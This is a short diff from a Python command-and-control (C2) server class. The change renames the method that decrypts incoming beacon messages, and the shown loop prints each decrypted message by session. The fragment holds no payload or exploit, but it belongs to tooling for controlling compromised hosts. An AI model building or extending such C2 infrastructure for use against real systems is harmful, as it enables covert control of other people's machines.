@@ -67,7 +67,7 @@ class C2Server:
                 if not encrypted_data:  #if recv() gives an empty result, happens when the beacon closes the socket, sends a FIN
                     break  #exit loop
                     
-                beacon_data = self.encryptor.decrypt_message(encrypted_data) #this is taking the encryption engine we defined at the top and using the .decrypt_message to decrypt the data coming in from the beacon
+                beacon_data = self.encryptor.DecryptMessage(encrypted_data) #this is taking the encryption engine we defined at the top and using the .decrypt_message to decrypt the data coming in from the beacon
                     
                 print(f"[Beacon {session_id}] -> {beacon_data}")
 
